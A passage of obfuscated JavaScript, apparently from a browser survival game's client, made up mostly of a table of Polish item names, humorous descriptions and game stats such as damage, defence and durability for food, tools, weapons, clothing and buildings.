			const ⲆᐃᐃΔⵠΔⵠⵠⲆ = ⵠΔᐃⲆΔΔⵠ(ΔᐃΔᐃ[ΔⲆΔΔΔ], ΔᐃΔᐃ[ⵠⲆⲆ]);
			const ⵠⵠⵠⲆⲆⵠⵠ = ~(42477 & ᐃΔΔⲆΔᐃⵠ) & ᐃΔΔⲆΔᐃⵠ | ~(ᐃΔΔⲆΔᐃⵠ & 42477) & 42477;
			return ⵠⵠⵠⲆⲆⵠⵠ
		}

		function ⲆⵠⲆᐃᐃⲆⲆ(ΔΔⲆⲆᐃⲆᐃ, ᐃⲆΔΔⲆⲆⲆ, ⲆᐃᐃⵠⲆᐃⲆ, ⵠⵠΔΔΔᐃⵠ, ᐃΔᐃⲆⵠᐃΔ) {
			const Δⵠᐃᐃᐃᐃᐃ = ((21118 + ΔΔⲆⲆᐃⲆᐃ) * 22695477 + 1) % 4294967296;
			const ᐃⲆΔⲆᐃⲆΔ = (1013904223 + 1664525 * (51955 + ᐃⲆΔΔⲆⲆⲆ)) % 4294967296;
			const ᐃΔΔⵠⵠⲆⵠ = 56341 ^ ⲆᐃᐃⵠⲆᐃⲆ;
			const ᐃⲆⵠᐃⵠᐃΔ = ~(29558 & ⵠⵠΔΔΔᐃⵠ) & (29558 | ⵠⵠΔΔΔᐃⵠ);
			const ⵠⵠΔᐃΔⲆⵠⲆΔ = ~(40626 & ᐃΔᐃⲆⵠᐃΔ) & (40626 | ᐃΔᐃⲆⵠᐃΔ);
			const ΔᐃⵠⲆⲆᐃᐃ = ΔⵠΔⵠᐃⲆΔ(Δⵠᐃᐃᐃᐃᐃ, ᐃⲆΔⲆᐃⲆΔ);
			const ⲆⲆⵠᐃΔⵠⲆ = ΔⵠΔⵠᐃⲆΔ(ᐃΔΔⵠⵠⲆⵠ, ᐃⲆⵠᐃⵠᐃΔ);
			const ΔᐃⵠⵠⲆⲆᐃ = (1 + (17254 + (ΔᐃⵠⲆⲆᐃᐃ ^ ⲆⲆⵠᐃΔⵠⲆ)) * 22695477) % 4294967296;
			return ΔᐃⵠⵠⲆⲆᐃ
		}

		function ΔⵠΔⵠᐃⲆΔ(ΔᐃΔⵠᐃ, ᐃΔΔᐃⲆΔΔ) {
			const ΔᐃᐃⵠᐃⲆᐃ = ~(55623 & ΔᐃΔⵠᐃ) & ΔᐃΔⵠᐃ | ~(ΔᐃΔⵠᐃ & 55623) & 55623;
			const ⵠⵠᐃⲆⵠΔⲆ = (24 << (ᐃΔΔᐃⲆΔΔ >> 0 & 255)) + (8 << (ᐃΔΔᐃⲆΔΔ >> 24 & 255)) + (16 << (ᐃΔΔᐃⲆΔΔ >> ⵠⵠⲆⵠΔ & 255)) + (0 << (ᐃΔΔᐃⲆΔΔ >> 16 & 255));
			const ⲆⵠⵠⲆⲆⲆⲆ = ᐃⵠⲆⵠΔⲆΔ(ΔᐃᐃⵠᐃⲆᐃ, ⵠⵠᐃⲆⵠΔⲆ, ΔᐃᐃⵠᐃⲆᐃ);
			const ⲆⲆᐃⵠΔⲆⲆⵠⲆ = ⵠⵠⲆⲆⵠⵠᐃ(ⵠⵠᐃⲆⵠΔⲆ, ΔᐃᐃⵠᐃⲆᐃ, ⵠⵠᐃⲆⵠΔⲆ, ΔᐃᐃⵠᐃⲆᐃ);
			const ⵠⲆᐃᐃⵠⵠᐃ = ~(52959 & ⲆⵠⵠⲆⲆⲆⲆ) & ⲆⵠⵠⲆⲆⲆⲆ | ~(ⲆⵠⵠⲆⲆⲆⲆ & 52959) & 52959;
			return ⵠⲆᐃᐃⵠⵠᐃ
		}
		var ᐃᐃᐃⵠΔⲆᐃ = function() {
			ΔⵠΔ[ᐃᐃ.ⲆᐃΔᐃᐃ] = [ⵠ[207]];
			ᐃᐃΔᐃ[22] = [ⵠ[41]];
			ΔⵠΔ[ᐃᐃ.ΔⵠⲆΔⵠ] = [ⵠ[169], ⵠ[59], ⵠ[57]];
			ΔⵠΔ[ⲆⲆΔ.ᐃⲆΔᐃᐃⵠᐃ] = ⵠ[251];
			ΔⵠΔ[ⲆⲆΔ.ΔⵠⵠᐃᐃΔⵠ] = ⵠ[335];
			ΔⵠΔ[ⲆⲆΔ.ΔⵠᐃⲆⲆⲆΔ] = ⵠ[462];
			ΔⵠΔ[ⲆⲆΔ.ⲆᐃΔᐃᐃᐃⵠ] = ⵠ[270];
			ΔⵠΔ[ⲆⲆΔ.POINTS] = ⵠ[250];
			ΔⵠΔ[ⲆⲆΔ.ⵠΔΔᐃᐃᐃⵠ] = ⵠ[165];
			ΔⵠΔ[ⲆⲆΔ.ⲆᐃⵠⵠΔΔΔ] = ⵠ[203];
			ΔⵠΔ[ⲆⲆΔ.ⲆᐃᐃⵠⲆⲆᐃ] = ⵠ[368];
			ΔⵠΔ[ⲆⲆΔ.ΔΔⲆΔⲆᐃⲆ] = ⵠ[538];
			ΔⵠΔ[ⲆⲆΔ.ΔⲆⲆΔᐃⲆᐃ] = ⵠ[208];
			ΔⵠΔ[ᐃᐃ.ᐃΔΔΔⵠ] = [ⵠ[188], ⵠ[439], ⵠ[134]];
			ΔⵠΔ[ᐃᐃ.ᐃᐃΔⲆΔ] = [ⵠ[518], ⵠ[ⲆⲆⲆᐃΔ], ⵠ[449], ⵠ[492]];
			ΔⵠΔ[ᐃᐃ.ΔⲆⲆⲆⲆ] = [ⵠ[287], ⵠ[194], ⵠ[393], ⵠ[489], ⵠ[68], ⵠ[388]];
			ΔⵠΔ[ᐃᐃ.ⲆⲆⲆⲆΔ] = [ⵠ[295], ⵠ[577], ⵠ[527], ⵠ[425], ⵠ[463]];
			document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[219])[ΔᐃⲆⵠⲆⵠΔ[290]] = ⵠ[249];
			document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[546])[ΔᐃⲆⵠⲆⵠΔ[290]] = ⵠ[286];
			document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[185])[ΔᐃⲆⵠⲆⵠΔ[290]] = ⵠ[220];
			document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[136])[ΔᐃⲆⵠⲆⵠΔ[290]] = ⵠ[355];
			document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[579])[ΔᐃⲆⵠⲆⵠΔ[290]] = ⵠ[485];
			document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[327])[ΔᐃⲆⵠⲆⵠΔ[290]] = ⵠ[441];
			document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[322])[ΔᐃⲆⵠⲆⵠΔ[290]] = ⵠ[390];
			document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[514])[ΔᐃⲆⵠⲆⵠΔ[290]] = ⵠ[296];
			document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[334])[ΔᐃⲆⵠⲆⵠΔ[290]] = ⵠ[242];
			document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[233])[ΔᐃⲆⵠⲆⵠΔ[290]] = ⵠ[217];
			document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[179])[ΔᐃⲆⵠⲆⵠΔ[290]] = ⵠ[230];
			document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[109])[ΔᐃⲆⵠⲆⵠΔ[290]] = ⵠ[45];
			for (var ⵠᐃ = Δⵠᐃ; ⲆⲆⲆᐃΔ > ⵠᐃ; ⵠᐃ++) document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[ΔⵠᐃΔⵠ] + ⵠᐃ)[ΔᐃⲆⵠⲆⵠΔ[290]] = ⵠ[451];
			document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[487])[ΔᐃⲆⵠⲆⵠΔ[290]] = ⵠ[309];
			ΔⵠΔ[ᐃᐃ.ᐃⲆᐃΔᐃ] = ["Ręka"];
			ΔⵠΔ[ᐃᐃ.ⲆⵠΔⲆᐃ] = ["Ziemia", "Brudna!"];
			ΔⵠΔ[ᐃᐃ.ΔⲆⲆΔⵠ] = ["Piasek", "Mam go w oczach!"];
			ΔⵠΔ[ᐃᐃ.ⵠⲆⲆᐃ] = ["Drewno", "Nie możesz mieć go wystarczająco!"];
			ΔⵠΔ[ᐃᐃ.ᐃᐃΔⲆ] = ["Kamień", "Także nazywany skałą"];
			ΔⵠΔ[ᐃᐃ.ΔⲆⵠⵠ] = ["Złoto", "Bądź hojny, daj trochę innym"];
			ΔⵠΔ[ᐃᐃ.ΔⲆᐃΔ] = ["Diament", "Co z nim zrobisz?"];
			ΔⵠΔ[ᐃᐃ.ⲆⵠΔⲆ] = ["Ametyst", "Jest Fiołkowy jak Lapa"];
			ΔⵠΔ[ᐃᐃ.ⵠᐃⲆⵠᐃ] = ["Mąka", "Używana w gotowaniu"];
			ΔⵠΔ[ᐃᐃ.ΔⵠⲆᐃᐃ] = ["Ciastko", "Przepyszne ciasteczko od babci", "Jedzenie: 50"];
			ΔⵠΔ[ᐃᐃ.ⲆΔΔⲆᐃ] = ["Ciasto", "Raj dla smakoszy", ⵠ[403]];
			ΔⵠΔ[ᐃᐃ.ⵠⲆᐃⲆⵠ] = ["Surowe mięso", "Możesz je upiec w ogniu", "Powoduje zatrucie pokarmowe: 10", "Jedzenie: 15"];
			ΔⵠΔ[ᐃᐃ.ⲆᐃⲆⲆⲆ] = ["Pieczone mięso", "Krwisty stek, proszę", "Jedzenie: 35"];
			ΔⵠΔ[ᐃᐃ.ᐃΔΔΔΔ] = ["Surowa ryba", "Myślę, że nadal jest żywa", "Powoduje zatrucie pokarmowe: 10", "Jedzenie: 18"];
			ΔⵠΔ[ᐃᐃ.Ⲇⵠᐃᐃⵠ] = ["Pieczona ryba", "Z cytryną jest idealna", " Jedzenie: 35"];
			ΔⵠΔ[ᐃᐃ.ⲆΔⵠΔⲆ] = ["Chleb", "Świetny Francuski chleb", "Jest walutą używaną w markecie", "Jedzenie: 15"];
			ΔⵠΔ[ᐃᐃ.ΔⵠⲆⵠⵠ] = ["Kanapka", "Smakuje jak kraboburger", ⵠ[403]];
			ΔⵠΔ[ᐃᐃ.ⵠⲆⵠᐃⲆ] = ["Cukierki", "Tylko dla dzieci!", ⵠ[403]];
			ΔⵠΔ[ᐃᐃ.ΔᐃⲆⵠⲆ] = ["Laska cukrowa", "Spróbuj, jest przepyszna", ⵠ[403]];
			ΔⵠΔ[ᐃᐃ.ᐃⲆⲆⲆᐃ] = ["Girlanda", "Idealna do dekorowania dachów"];
			ΔⵠΔ[ᐃᐃ.ⵠΔⵠᐃΔ] = ["Nasionko jagody", "Wyrośnie w jagody", "Narodziny: 2min", "Rośnięcie: 55s", "Podlewanie: 3min 20s", ⵠ[304], ⵠ[95]];
			ΔⵠΔ[ᐃᐃ.ⵠⲆΔⲆⲆ] = ["Jagody", "Jagody są pyszne!", "Jedzenie: 10"];
			ΔⵠΔ[ᐃᐃ.ⲆⵠⲆΔⲆ] = ["Nasiono pszenicy", "Wyrośnie w pszenicę", "Narodziny: 2min", "Rośnięcie: 16s", "Podlewanie: 2min", ⵠ[304], ⵠ[95]];
			ΔⵠΔ[ᐃᐃ.ⵠⲆⲆⲆⵠ] = ["Pszenica", "Zamienia się w mąkę jeżeli wrzucisz ją do wiatraka"];
			ΔⵠΔ[ᐃᐃ.ⵠⵠΔⲆⵠ] = ["Nasiono dyni", "Wyrośnie w dynię", "Narodziny: 2min 40s", "Rośnięcie: 2min", "Podlewanie: 2min", ⵠ[304], ⵠ[95]];
			ΔⵠΔ[ᐃᐃ.ⲆⲆⵠΔΔ] = ["Dynia", "Przypomina mi o Halloween", "Jedzenie: 30"];
			ΔⵠΔ[ᐃᐃ.ⵠⲆⲆⵠⲆ] = ["Nasionko czosnku", "Bardzo niebezpieczne dla wampirów", "Obrażenia: 20", "Narodziny: 4min", "Rośnięcie: 1min 10s", "Podlewanie: 1min 40s", ⵠ[304], ⵠ[95]];
			ΔⵠΔ[ᐃᐃ.ⲆΔⵠΔⵠ] = ["Czosnek", "Leczy cię i redukuje zimno", "Jedzenie: 14", "Uzdrawia z biegiem czasu: 30", "Efekt: 1"];
			ΔⵠΔ[ᐃᐃ.ⵠⵠᐃⵠⲆ] = ["Nasiono kolczastego krzewu", "Może zranić twoich wrogów", "Obrażenia: 20", "Narodziny: 4min", "Rośnięcie: 15s", "Podlewanie: 3min", ⵠ[342], ⵠ[95]];
			ΔⵠΔ[ᐃᐃ.ᐃⵠᐃΔΔ] = ["Kolczasty krzew", "Kłuje!"];
			ΔⵠΔ[ᐃᐃ.ⵠᐃΔⲆⲆ] = ["Donica", "Naprawdę, użyj jej", "Z tym genetycznie modyfikowanym nawozem, twoje rośliny", "będą rosły znacznie szybciej i będą potrzebować mniej wody", ⵠ[426]];
			ΔⵠΔ[ᐃᐃ.ᐃⵠⲆⲆΔ] = ["Lód", "Użyteczny do robienia ciast i wody"];
			ΔⵠΔ[ᐃᐃ.ΔΔᐃⲆΔ] = ["Klucz mechaniczny", "Do naprawiania drzwi i kolców", "Uszkodzenie: 2"];
			ΔⵠΔ[ᐃᐃ.ΔᐃᐃᐃΔ] = ["Wilcza skóra", "Szczeniaczek? Ale gdzie jest szczeniaczek?!"];
			ΔⵠΔ[ᐃᐃ.ⲆᐃⵠⲆᐃ] = ["Skóra królika", "Ten królik był taki słodziutki..."];
			ΔⵠΔ[ᐃᐃ.ΔⲆⵠᐃⲆ] = ["Skóra", "Jesteś fabryką chleba"];
			ΔⵠΔ[ᐃᐃ.ΔⲆΔⵠΔ] = ["Ciemna skóra", "Byłeś gotowy zrobić coś złego"];
			ΔⵠΔ[ᐃᐃ.ᐃⲆΔⲆⲆ] = ["Zimowa skóra", "Te zwierzęta chciały się tylko przytulić..."];
			ΔⵠΔ[ᐃᐃ.ⲆⲆⲆᐃᐃ] = ["Łuski", "Pachnie jak ryba!"];
			ΔⵠΔ[ᐃᐃ.ᐃⲆᐃⲆᐃ] = ["Skóra krakena", "Nie byłeś zbyt przestraszony?"];
			ΔⵠΔ[ᐃᐃ.ⵠⲆΔᐃΔ] = ["Ognisko", "Ociepli cię!", "Wytrzymałość: 150", "Czas życia: 2min"];
			ΔⵠΔ[ᐃᐃ.ⲆⵠⵠⵠⲆ] = ["Duże ognisko", "Ociepli cię na dłużej!", "Wytrzymałość: 400", "Czas życia: 6min"];
			ΔⵠΔ[ᐃᐃ.ᐃⲆⲆΔᐃ] = ["Stół rzemieślniczy", "Użyteczny do stwarzania przedmiotów"];
			ΔⵠΔ[ᐃᐃ.ᐃᐃᐃΔΔ] = ["Nić", "Używany w tworzeniu czapek i plecaków"];
			ΔⵠΔ[ᐃᐃ.ΔΔΔΔᐃ] = ["Diamentowa nić", "Używana w tworzeniu specjalnych czapek"];
			ΔⵠΔ[ᐃᐃ.ⵠⵠⵠᐃⵠ] = ["Skrzynia", "Pozwala ci na przechowywanie przedmiotów", "Wytrzymałość: 500"];
			ΔⵠΔ[ᐃᐃ.ΔΔⵠᐃᐃ] = ["Drewniany miecz", "To coś działa?", "Obrażenia: 12", "Obrażenia do budowli: 4"];
			ΔⵠΔ[ᐃᐃ.ⲆᐃⵠΔᐃ] = ["Kamienny miecz", "Bądź miły dla innych", "Obrażenia: 19", "Obrażenia do budowli: 6"];
			ΔⵠΔ[ᐃᐃ.ⵠᐃⲆⵠΔ] = ["Złoty miecz", "Król lasu", "Obrażenia: 22", "Obrażenia do budowli: 7"];
			ΔⵠΔ[ᐃᐃ.ᐃΔⵠᐃⵠ] = ["Diamentowy miecz", "Możesz poczuć moc", "Obrażenia: 24", "Obrażenia do budowli: 8"];
			ΔⵠΔ[ᐃᐃ.ⲆᐃⲆⲆΔ] = ["Piracki miecz", "Ayyyyy!", "Dłuższy niż zwykły miecz", "Obrażenia: 24", "Obrażenia do budowli: 8"];
			ΔⵠΔ[ᐃᐃ.ⵠⵠᐃⲆⲆ] = ["Ametystowy miecz", "fiołkowy to najpiękniejszy kolor na świecie", "Damage: 27", "Obrażenia do budowli: 9"];
			ΔⵠΔ[ᐃᐃ.ᐃⲆⲆᐃⲆ] = ["Smoczy miecz", "Bez litości!", "Obrażenia: 30", "Obrażenia do budowli: 10"];
			ΔⵠΔ[ᐃᐃ.ⲆⲆⵠᐃⵠ] = ["Smocza włócznia", "Zabij ich wszystkich!", "Obrażenia: 22", "Obrażenia do budowli: 6"];
			ΔⵠΔ[ᐃᐃ.ΔᐃⲆΔⲆ] = ["Drewniany kilof", "Może wydobywać tylko kamienie i drewno", "Obrażenia: 1"];
			ΔⵠΔ[ᐃᐃ.ⲆⵠᐃⵠΔ] = ["Kamienny kilof", "Może wydobywać drewno, kamienie i złoto", "Obrażenia: 2"];
			ΔⵠΔ[ᐃᐃ.ΔΔⲆⵠⲆ] = ["Złoty kilof", "Może także wydobywać diamenty", "Obrażenia: 3", ⵠ[140]];
			ΔⵠΔ[ᐃᐃ.ⵠⲆⲆΔⲆ] = ["Diamentowy kilof", "Może wydobywać wszystko", "Obrażenia: 4", ⵠ[140]];
			ΔⵠΔ[ᐃᐃ.ⵠⲆⵠΔᐃ] = ["Ametystowy kilof", "Może wydobywać wszystko. Wygląda fantastycznie!", "Obrażenia: 5", ⵠ[140]];
			ΔⵠΔ[ᐃᐃ.ΔⵠⲆΔⲆ] = ["Kamienny młot", ⵠ[130], "Nie działa najlepiej na ametyście", "Obrażenia: 2", "Obrażenia do budowli: 20"];
			ΔⵠΔ[ᐃᐃ.ⲆᐃⵠΔⲆ] = ["Złoty młot", ⵠ[130], "Nie działa najlepiej na ametyście", "Obrażenia: 3", "Obrażenia do budowli: 30"];
			ΔⵠΔ[ᐃᐃ.ᐃᐃᐃⲆⵠ] = ["Diamentowy młot", ⵠ[130], "Obrażenia: 4", "Obrażenia do budowli: 40"];
			ΔⵠΔ[ᐃᐃ.ⲆⵠⵠⲆⵠ] = ["Ametystowy młot", ⵠ[130], "Obrażenia: 5", "Obrażenia do budowli: 50"];
			ΔⵠΔ[ᐃᐃ.ᐃⵠⵠⵠᐃ] = ["Super młot", "Miałeś kiedyś plan zniszczenia świata?", "Obrażenia: 12", "Obrażenia do budowli: 70"];
			ΔⵠΔ[ᐃᐃ.ⲆⲆⵠΔⲆ] = ["Drewniana włócznia", "Jak patyk, ale kłuje.", "Obrażenia: 10", "Obrażenia do budowli: 2"];
			ΔⵠΔ[ᐃᐃ.ΔⵠΔΔⲆ] = ["Kamienna włócznia", "Początek ewolucji!", "Obrażenia: 14", "Obrażenia do budowli: 4"];
			ΔⵠΔ[ᐃᐃ.ⵠⵠⲆΔⲆ] = ["Złota włócznia", "Uważaj, kłuje!", "Obrażenia: 15", "Obrażenia do budowli: 5"];
			ΔⵠΔ[ᐃᐃ.ΔᐃΔΔΔ] = ["Diamentowa włócznia", "Jesteś gotowy, aby zabić smoka", "Obrażenia: 17", "Obrażenia do budowli: 5"];
			ΔⵠΔ[ᐃᐃ.ⲆⲆΔᐃΔ] = ["Ametystowa włócznia", "Smoki już nie są dla ciebie zagrożeniem", "Obrażenia: 18", "Obrażenia do budowli: 6"];
			ΔⵠΔ[ᐃᐃ.ΔⵠⵠΔᐃ] = ["Kamienna łopata", ⵠ[432], ⵠ[571], "Obrażenia: 2"];
			ΔⵠΔ[ᐃᐃ.ΔΔⲆⵠΔ] = ["Złota łopata", ⵠ[432], ⵠ[571], "Obrażenia: 3", ⵠ[140]];
			ΔⵠΔ[ᐃᐃ.ⵠᐃΔΔᐃ] = ["Diamentowa łopata", ⵠ[432], ⵠ[571], "Obrażenia: 4", ⵠ[140]];
			ΔⵠΔ[ᐃᐃ.ⵠᐃᐃⲆΔ] = ["Ametystowa łopata", ⵠ[432], ⵠ[571], "Obrażenia: 5", ⵠ[140]];
			ΔⵠΔ[ᐃᐃ.ᐃⵠⵠⲆΔ] = ["Drewniany hełm", "Lepsze niż nic", "Obrona przed graczami: 1", "Obrona przed zwierzętami: 4"];
			ΔⵠΔ[ᐃᐃ.ⵠΔΔᐃⲆ] = ["Kamienny hełm", "Jesteś gotowy do bitwy!", "Obrona przed graczami: 2", "Obrona przed zwierzętami: 8"];
			ΔⵠΔ[ᐃᐃ.ⲆⵠⲆⵠΔ] = ["Złoty hełm", "Zwany także hełmem barbarzyńców", "Obrona przed graczami: 4", "Obrona przed zwierzętami: 13"];
			ΔⵠΔ[ᐃᐃ.ᐃΔⲆⲆⲆ] = ["Diamentowy hełm", "Nie przechwalaj się za bardzo", "Obrona przed graczami: 5", "Obrona przed zwierzętami: 19"];
			ΔⵠΔ[ᐃᐃ.ⲆⵠΔⲆΔ] = ["Ametystowy hełm", "Nie boisz się już niczego", "Obrona przed graczami: 6", "Obrona przed zwierzętami: 23"];
			ΔⵠΔ[ᐃᐃ.ⵠᐃⲆⲆⵠ] = ["Smoczy hełm", "Zmierzysz się z całym światem", "Obrona przed graczami: 8", "Obrona przed zwierzętami: 27"];
			ΔⵠΔ[ᐃᐃ.ΔⵠⲆⵠΔ] = ["Czapka odkrywcy", "Zwierzęta nie będą zwracały na ciebie uwagi", "ale nie rób hałasu!", ⵠ[73]];
			ΔⵠΔ[ᐃᐃ.ΔⵠᐃⲆⲆ] = ["świąteczna czapka", "Oh, oh, oh, Wesołych Świąt", ⵠ[73]];
			ΔⵠΔ[ᐃᐃ.ΔⲆΔⵠⵠ] = ["Czapka elfa", "Nie pozwól się być wykorzystywanym, mały śnieżny elfie!", ⵠ[73]];
			ΔⵠΔ[ᐃᐃ.ⲆⵠᐃΔΔ] = ["Kaptur", "Jesteś łobuzem", "Możesz coś komuś ukraść jeśli", "- Jest noc", "- Nic przy sobie nie masz", "- Jeżeli nic przez chwilę nie dotykałeś", "- Nie jesteś blisko ognia", "- Twój cel nie jest ubrany w chłopską tunikę", "Jest ciepło w i poza zimą"];
			ΔⵠΔ[ᐃᐃ.ΔⵠᐃⲆⵠ] = ["Nauszniki", "Jakiś inny rodzaj małej czapki.", ⵠ[73]];
			ΔⵠΔ[ᐃᐃ.ᐃᐃⲆⵠᐃ] = ["Czapka", "Także nazywana płaszczem.", "Ciepła w i poza zimą"];
			ΔⵠΔ[ᐃᐃ.ⲆⵠΔᐃⲆ] = ["Szal i czapka", "Bardzo wygodna, bardzo ciepła"];
			ΔⵠΔ[ᐃᐃ.ⲆⲆΔⲆᐃ] = ["Chłopska tunika", "Twoje rośliny rosną szybciej", "Ciepła w i poza zimą"];
			ΔⵠΔ[ᐃᐃ.ΔᐃᐃΔᐃ] = ["Zimowy kaptur", "Możesz coś komuś ukraść jeśli", "- Jest noc", "- Nic przy sobie nie masz", "- Jeżeli nic przez chwilę nie dotykałeś", "- Nie jesteś blisko ognia", "- Twój cel nie jest ubrany w tunikę zimowego chłopa", "Jest ciepło w i poza zimą"];
			ΔⵠΔ[ᐃᐃ.ᐃΔⲆᐃⲆ] = ["Zimowa chłopska tunika", "Twoje rośliny rosną szybciej", ⵠ[73]];
			ΔⵠΔ[ᐃᐃ.ᐃⲆΔΔⵠ] = ["Maska do nurkowania", "Jesteś szybki w wodzie", "Ciepło", "Obrona przed graczami: 2, Obrona przed zwierzętami: 8"];
			ΔⵠΔ[ᐃᐃ.ΔⵠᐃΔⲆ] = ["Strój głębinowy", "Jesteś bardzo szybki w wodzie", "Ciepło ci w wodzie", ⵠ[222]];
			ΔⵠΔ[ᐃᐃ.ⵠⵠⵠΔⵠ] = ["Smocza kula", "Zdobyta podczas zadania"];
			ΔⵠΔ[ᐃᐃ.ⵠΔⲆⲆᐃ] = ["Smocze serce", "Zamienia cię w ducha po śmierci!", "Jesteś duchem na 60 sekund", "Znajdź kamień rezurekcyjny"];
			ΔⵠΔ[ᐃᐃ.ΔⲆⵠᐃⵠ] = ["Zielony kryształ", "Nie oszukiwałeś, przysięgasz?"];
			ΔⵠΔ[ᐃᐃ.ΔᐃⲆᐃᐃ] = ["Pomarańczowy kryształ", "Tylko prawdziwy pirat może go znaleźć!"];
			ΔⵠΔ[ᐃᐃ.ᐃᐃΔⵠΔ] = ["Niebieski kryształ", "Dla zbyt miłych ludzi"];
			ΔⵠΔ[ᐃᐃ.Ⲇⵠᐃⵠⵠ] = ["Zielona korona", "Szybko się leczysz", "Uzdrawia z biegiem czasu: 40", ⵠ[222]];
			ΔⵠΔ[ᐃᐃ.ᐃΔⵠⲆⲆ] = ["Pomarańczowa korona", "Nagle poczułeś smak szczęścia", ⵠ[222]];
			ΔⵠΔ[ᐃᐃ.ΔᐃᐃΔΔ] = ["Niebieska korona", "Gdy już będziesz martwy, zamienisz się w ducha", "Przy okazji stracisz swoją broń i kilof", ⵠ[222]];
			ΔⵠΔ[ᐃᐃ.ΔⵠⵠⵠΔ] = ["Wiadro", "Również przydatne do napełnienia studni", "Jedno wiadro jest jak dwanaście butelek"];
			ΔⵠΔ[ᐃᐃ.Δⵠⵠⵠⵠ] = ["Puste wiadro", "Musisz napełnić to wiadro wodą"];
			ΔⵠΔ[ᐃᐃ.ⵠⲆᐃᐃᐃ] = ["Butelka", "Pozwala pić wodę wszędzie", "Woda: 50"];
			ΔⵠΔ[ᐃᐃ.ᐃᐃⲆⲆᐃ] = ["Pusta butelka", "Możesz napełnić tą butelkę blisko źródła wody"];
			ΔⵠΔ[ᐃᐃ.ⵠᐃⲆᐃⵠ] = ["Pusta konewka", "Musisz ją napełnić w źródle wody, aby ją użyć"];
			ΔⵠΔ[ᐃᐃ.ⵠⲆⲆⵠⵠ] = ["Konewka", "Pozwala podlewać rośliny", "Obrażenia: 1"];
			ΔⵠΔ[ᐃᐃ.ⵠᐃᐃⵠ] = ["Plecak", "Więcej miejsca na twoje przedmioty!"];
			ΔⵠΔ[ᐃᐃ.ⵠΔⵠΔⲆ] = ["Papier", "Używany w tworzeniu książki"];
			ΔⵠΔ[ᐃᐃ.ⵠⵠⲆⵠⲆ] = ["Książka", "Pozwala znacznie skrócić wytwarzanie", "Musisz ją nosić by zadziałała", "Uszkodzenie 1"];
			ΔⵠΔ[ᐃᐃ.ΔΔⵠⵠᐃ] = ["Bandaż", "Szybciej zregeneruj życie", "Uzdrawia z biegiem czasu: 30", "Efekt: 5"];
			ΔⵠΔ[ᐃᐃ.ΔΔΔⵠᐃ] = ["Zamek", "Pozwala ci zamknąć skrzynię"];
			ΔⵠΔ[ᐃᐃ.ΔⵠΔⵠΔ] = ["Wytrych", "Pozwala ci odblokować jedną skrzynię"];
			ΔⵠΔ[ᐃᐃ.ⲆΔᐃⲆᐃ] = [ⵠ[534], "Pozwala ci stworzyć drużynę", "Dziel się drzwiami i zamkniętymi skrzyniami", "Szkodliwe budynki nie zranią twoich przyjaciół"];
			ΔⵠΔ[ᐃᐃ.ΔⲆΔⲆᐃ] = ["Most", "Bardzo przydatny w wodzie", "Pozwala ci pić bez utonięcia", "Chodzisz szybciej w wodzie"];
			ΔⵠΔ[ᐃᐃ.ᐃⵠᐃⲆᐃ] = ["Tabliczka", "Zostaw wiadomość dla innych", "Wytrzymałość: 200"];
			ΔⵠΔ[ᐃᐃ.ⵠΔⲆᐃⵠ] = ["Dach", "Trochę cie ogrzewa i chowa!"];
			ΔⵠΔ[ᐃᐃ.ΔⲆᐃΔⵠ] = ["Studnia", "Umożliwia napełnienie butelki", ⵠ[342]];
			ΔⵠΔ[ᐃᐃ.ⲆΔΔⵠᐃ] = ["Drewniany mur", "Znasz taniec ścian?", ⵠ[342]];
			ΔⵠΔ[ᐃᐃ.ΔⵠΔⲆⲆ] = ["Kamienny mur", "Jest to trochę bardziej poważniejsze.", "Wytrzymałość: 1500"];
			ΔⵠΔ[ᐃᐃ.ⲆᐃᐃΔⲆ] = [" Złoty mur", "Złoto na twoich murach? To trochę krzykliwe.", ⵠ[426]];
			ΔⵠΔ[ᐃᐃ.ⲆΔⲆᐃᐃ] = ["Diamentowy mur", "Jaki błyszczący, uważaj na oczy", "Wytrzymałość: 2500"];
			ΔⵠΔ[ᐃᐃ.ᐃΔᐃΔⵠ] = ["Ametystowy mur", "Musisz bardzo się bać, aby wyjść!", "Wytrzymałość: 3000"];
			ΔⵠΔ[ᐃᐃ.ⵠⵠⵠΔⲆ] = ["Drewniany kolczasty mur", "Może uszkodzić wrogów", "Obrażenia: 10, Obrażenia po uszkodzeniu: 2", "Wytrzymałość: 150"];
			ΔⵠΔ[ᐃᐃ.ⲆΔᐃΔᐃ] = ["Kamienny kolczasty mur", "Nie chciałbym być twoim wrogiem.", "Obrażenia: 20", " Obrażenia po uszkodzeniu: 3", "Wytrzymałość: 300"];
			ΔⵠΔ[ᐃᐃ.ⲆΔⲆⵠΔ] = ["Złoty kolczasty mur", "Jesteśtaki okrutny.", "Obrażenia: 30", " Obrażenia po uszkodzeniu: 3", "Wytrzymałość: 600"];
			ΔⵠΔ[ᐃᐃ.ⲆⲆΔⵠⲆ] = ["Diamentowy kolczasty mur", "Raczej nie lubisz towarzystwa.", "Obrażenia: 40", "Obrażenia po uszkodzeniu: 4", "Wytrzymałość: 1200"];
			ΔⵠΔ[ᐃᐃ.ΔⲆⵠⵠᐃ] = ["Ametystowy kolczasty mur", "Co ci sąsiedzi ci zrobili?", "Obrażenia: 50", "Obrażenia po uszkodzeniu: 4", "Wytrzymałość: 2400"];
			ΔⵠΔ[ᐃᐃ.ⵠᐃᐃⵠᐃ] = ["Drewniane drzwi", "Może być otwarte przez ciebie lub przyjaciół", ⵠ[342]];
			ΔⵠΔ[ᐃᐃ.ⲆΔⵠΔΔ] = ["Kamienne drzwi", "Solidne drzwi są bardziej poważne ", "Wytrzymałość: 1500"];
			ΔⵠΔ[ᐃᐃ.ⵠᐃⵠⵠᐃ] = ["Złote drzwi", "Czy odbudowujesz El Dorado?", ⵠ[426]];
